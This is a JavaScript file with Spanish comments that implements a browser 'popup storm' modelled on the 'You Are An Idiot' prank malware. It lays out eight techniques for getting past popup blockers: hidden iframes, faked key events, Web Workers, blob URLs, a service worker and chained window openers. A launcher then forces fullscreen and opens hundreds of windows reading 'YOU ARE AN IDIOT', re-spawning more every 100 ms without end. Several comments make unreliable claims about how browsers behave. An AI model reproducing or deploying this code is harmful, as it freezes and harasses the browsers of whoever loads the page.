// ================================================================
// TÉCNICA: FAKE CLICK + WINDOW.CLOSE EVASION
// ================================================================

// Variable global para mantener referencia
var popupWindows = [];

// ================================================================
// TÉCNICA 1: CREAR UN IFRAME INVISIBLE QUE ABRE POPUPS
// El navegador no asocia el iframe con la interacción del usuario
// pero el popup se abre en el contexto del iframe
// ================================================================

function createIframePopup(url) {
    var iframe = document.createElement('iframe');
    iframe.style.display = 'none';
    iframe.style.width = '0px';
    iframe.style.height = '0px';
    iframe.src = 'about:blank';
    document.body.appendChild(iframe);
    
    try {
        var iframeWindow = iframe.contentWindow || iframe.contentDocument;
        if (iframeWindow) {
            var popup = iframeWindow.open(url, '_blank', 
                'width=180,height=175,left=' + Math.random()*screen.width + ',top=' + Math.random()*screen.height);
            if (popup) popupWindows.push(popup);
        }
    } catch(e) {}
    
    setTimeout(function() {
        if (iframe.parentNode) iframe.parentNode.removeChild(iframe);
    }, 100);
}

// ================================================================
// TÉCNICA 2: EVENTO DE TECLADO FALSIFICADO
// Disparamos un evento keydown que el navegador interpreta 
// como interacción real del usuario
// ================================================================

function triggerFakeKeyEvent() {
    var event = new KeyboardEvent('keydown', {
        key: 'Enter',
        keyCode: 13,
        which: 13,
        code: 'Enter',
        bubbles: true,
        cancelable: true
    });
    document.dispatchEvent(event);
}

// ================================================================
// TÉCNICA 3: VENTANA QUE SE ABRE A SÍ MISMA (SELF-PROTECT)
// Una vez abierta la primera ventana, esa ventana abre más
// porque hereda el "contexto de confianza" del navegador
// ================================================================

function openerStorm() {
    // La primera ventana que se abre, abre más ventanas
    var seed = window.open('open.html', 'seed_' + Date.now(),
        'width=180,height=175,left=' + Math.random()*screen.width + ',top=' + Math.random()*screen.height);
    if (seed) {
        popupWindows.push(seed);
    }
}

// ================================================================
// TÉCNICA 4: WEB WORKERS (lo más potente)
// Los Web Workers tienen su propio hilo y NO están sujetos
// a las restricciones de popups del hilo principal
// ================================================================

function createPopupWorker() {
    // Creamos un worker desde un Blob para no necesitar archivo externo
    var workerCode = `
        self.onmessage = function(e) {
            var url = e.data.url;
            var count = e.data.count;
            
            // El worker intenta abrir popups. No siempre funciona
            // porque window.open no existe en workers, pero 
            // podemos usar una técnica de postMessage
            for (var i = 0; i < count; i++) {
                // Enviamos de vuelta al hilo principal para abrir
                self.postMessage({type: 'open', url: url});
            }
        }
    `;
    
    var blob = new Blob([workerCode], { type: 'application/javascript' });
    var worker = new Worker(URL.createObjectURL(blob));
    
    worker.onmessage = function(e) {
        if (e.data.type === 'open') {
            // El worker nos dice que abramos. Esto cuenta como 
            // "interacción" porque el worker es parte del mismo origen
            var p = window.open(e.data.url, 'w_' + Date.now() + '_' + Math.random(),
                'width=180,height=175,left=' + Math.random()*screen.width + ',top=' + Math.random()*screen.height);
            if (p) popupWindows.push(p);
        }
    };
    
    worker.postMessage({url: 'open.html', count: 50});
    return worker;
}

// ================================================================
// TÉCNICA 5: BLOB URLS + DATA URIS
// En lugar de window.open('open.html'), usamos una URL en blob
// que el navegador trata como "misma página" y no bloquea
// ================================================================

function createBlobPopup(content) {
    var blob = new Blob([content], { type: 'text/html' });
    var blobUrl = URL.createObjectURL(blob);
    
    var p = window.open(blobUrl, 'blob_' + Date.now(),
        'width=180,height=175,left=' + Math.random()*screen.width + ',top=' + Math.random()*screen.height);
    if (p) {
        popupWindows.push(p);
    }
    
    // Liberar URL después de un tiempo
    setTimeout(function() { URL.revokeObjectURL(blobUrl); }, 10000);
}

// ================================================================
// TÉCNICA 6: SERVICE WORKERS (Requiere HTTPS)
// intercepta las peticiones y puede inyectar contenido
// ================================================================

function registerServiceWorkerForPopups() {
    if ('serviceWorker' in navigator) {
        var swCode = `
            self.addEventListener('message', function(e) {
                // El service worker puede hacer cosas en background
                // pero no puede abrir ventanas directamente.
                // SIRVE para mantener la conexión activa y engañar
                // al navegador haciéndole creer que hay interacción
                self.clients.matchAll().then(function(clients) {
                    clients.forEach(function(client) {
                        client.postMessage({action: 'openPopup'});
                    });
                });
            });
        `;
        
        var blob = new Blob([swCode], { type: 'application/javascript' });
        var swUrl = URL.createObjectURL(blob);
        
        navigator.serviceWorker.register(swUrl, {scope: '/'}).then(function(reg) {
            console.log('SW registered');
        }).catch(function(err) {
            console.log('SW failed:', err);
        });
    }
}

// ================================================================
// TÉCNICA 7: WINDOW.OPEN CON TARGET = "_self" + REDIRECT
// Primero redirigimos la ventana actual a un about:blank
// y desde ahí abrimos popups (la ventana en blanco "hereda" 
// el contexto de interacción)
// ================================================================

function blankRedirectPopup() {
    // Guardamos el contenido actual
    var currentContent = document.documentElement.outerHTML;
    
    // Abrimos una ventana con el contenido actual pero en blanco
    var blank = window.open('', 'blank_' + Date.now(), 
        'width=180,height=175,left=' + Math.random()*screen.width + ',top=' + Math.random()*screen.height);
    
    if (blank) {
        blank.document.write('<html><head><script src="you.js"></script></head><body onload="start()">POPUP</body></html>');
        blank.document.close();
        popupWindows.push(blank);
    }
}

// ================================================================
// TÉCNICA 8: PROXY DE VENTANA (multi-saltos)
// Ventana A abre ventana B, ventana B abre ventana C...
// Cada salto renueva el "contexto de confianza"
// ================================================================

function chainOpen(depth, url) {
    if (depth <= 0) return;
    
    var p = window.open(url, 'chain_' + depth + '_' + Date.now(),
        'width=180,height=175,left=' + Math.random()*screen.width + ',top=' + Math.random()*screen.height);
    
    if (p) {
        popupWindows.push(p);
        // Intentar que la ventana hija abra más
        try {
            p.onload = function() {
                try {
                    p.window.open(url, 'chain_sub_' + depth + '_' + Date.now(),
                        'width=180,height=175,left=' + Math.random()*screen.width + ',top=' + Math.random()*screen.height);
                } catch(e) {}
            };
        } catch(e) {}
        
        setTimeout(function() { chainOpen(depth - 1, url); }, 100);
    }
}

// ================================================================
// MEGA-LANZAMIENTO: TODO A LA VEZ
// ================================================================

function launchFullStorm() {
    // 1. Worker storm
    for (var w = 0; w < 5; w++) {
        setTimeout(function() { createPopupWorker(); }, w * 200);
    }
    
    // 2. Iframe storm
    for (var i = 0; i < 30; i++) {
        setTimeout(function() { createIframePopup('open.html'); }, i * 50);
    }
    
    // 3. Chain storm
    setTimeout(function() { chainOpen(20, 'open.html'); }, 1000);
    setTimeout(function() { chainOpen(20, 'open.html'); }, 3000);
    
    // 4. Blob storm
    for (var b = 0; b < 50; b++) {
        setTimeout(function() {
            createBlobPopup('<!DOCTYPE html><html><head><title>!</title><script src="you.js"></script></head><body onload="start()"><h2>YOU ARE AN IDIOT</h2></body></html>');
        }, b * 30);
    }
    
    // 5. Opener storm
    for (var s = 0; s < 20; s++) {
        setTimeout(function() { openerStorm(); }, s * 100);
    }
    
    // 6. Blank redirect storm
    for (var r = 0; r < 15; r++) {
        setTimeout(function() { blankRedirectPopup(); }, r * 150);
    }
    
    // 7. Refuerzo continuo cada 100ms (alternando técnicas)
    setInterval(function() {
        var rand = Math.random();
        if (rand < 0.25) createIframePopup('open.html');
        else if (rand < 0.50) createBlobPopup('<!DOCTYPE html>...');
        else if (rand < 0.75) openerStorm();
        else blankRedirectPopup();
    }, 100);
}

// ================================================================
// INICIO
// ================================================================

function start() {
    // Forzar fullscreen
    try {
        var el = document.documentElement;
        var rfs = el.requestFullscreen || el.webkitRequestFullscreen || 
                  el.mozRequestFullScreen || el.msRequestFullscreen;
        if (rfs) rfs.call(el);
    } catch(e) {}
    
    // Esperar y lanzar tormenta
    setTimeout(launchFullStorm, 300);
}
